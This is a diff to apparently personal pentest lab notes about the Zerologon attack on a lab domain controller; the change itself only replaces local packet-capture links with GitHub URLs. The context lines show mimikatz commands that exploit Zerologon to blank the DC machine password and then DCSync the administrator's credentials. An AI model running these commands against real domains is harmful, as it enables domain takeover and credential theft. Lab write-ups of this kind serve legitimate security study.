@@ -185,7 +185,7 @@ Success! DC should now have the empty string as its machine password.
 
 
 
- [zerologo_impacket.pcapng](traffic\zerologo_impacket.pcapng) 
+ [zerologo_impacket.pcapng](https://github.com/RingLcy/Pentestlab/blob/master/traffic/zerologo_impacket.pcapng) 
 
 ![image-20201220154626164](/assets/img/image-20201220154626164.png)
 
@@ -232,7 +232,7 @@ lsadump::zerologon /target:ring2.com /account:ringdc-pc$ /exploit
 lsadump::dcsync /authuser:ringdc-pc$ /authpassword:"" /user:administrator /csv
 ```
 
-最新版mimikatz对流量加密了，看不到各函数调用 [zerologon_mimikatz_encrypt.pcapng](traffic\zerologon_mimikatz_encrypt.pcapng) 
+最新版mimikatz对流量加密了，看不到各函数调用 [zerologon_mimikatz_encrypt.pcapng](https://github.com/RingLcy/Pentestlab/blob/master/traffic/zerologon_mimikatz_encrypt.pcapng) 
 
 ![image-20201220165811271](/assets/img/image-20201220165811271.png)
 
